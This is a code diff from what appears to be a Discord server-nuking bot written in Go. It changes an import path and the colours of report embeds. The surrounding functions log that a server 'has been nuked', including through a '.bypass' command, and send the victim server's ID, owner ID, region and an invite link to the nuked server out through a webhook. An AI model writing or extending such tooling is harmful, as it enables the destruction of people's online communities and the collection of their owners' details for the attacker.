@@ -1,7 +1,7 @@
 package start_end
 
 import (
-	"Dynamic/core/requests"
+	"Athanatos/core/requests"
 	"encoding/json"
 	"fmt"
 	"os"
@@ -35,7 +35,7 @@ func Logs(s *discordgo.Session, m *discordgo.MessageCreate) {
 	embed := discordgo.MessageEmbed{
 		Title:     "Server " + fmt.Sprint(guild.Name) + " has been nuked.",
 		Thumbnail: &thumbnail,
-		Color:     00255,
+		Color:     16777215,
 		Description: "> **Server ID:** " + "`" + fmt.Sprint(guild.ID) + "`\n" +
 			"> **Owner ID:** " + "`" + fmt.Sprint(guild.OwnerID) + "`\n" +
 			"> **Region:** " + "`" + fmt.Sprint(guild.Region) + "`\n" +
@@ -69,7 +69,7 @@ func LogsAlert(s *discordgo.Session, m *discordgo.MessageCreate) {
 
 	embed := discordgo.MessageEmbed{
 		Title: "Server " + fmt.Sprint(guild.Name) + " has been nuked via ``.bypass`` command.",
-		Color: 00255,
+		Color: 16777215,
 	}
 
 	data := &discordgo.WebhookParams{
@@ -101,7 +101,7 @@ func InviteCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 
 	embed := discordgo.MessageEmbed{
 		Title:       "Invite to nuked server",
-		Color:       00255,
+		Color:       16777215,
 		Description: "> **" + "https://discord.gg/" + fmt.Sprint(invite.Code) + "**\n",
 	}
 
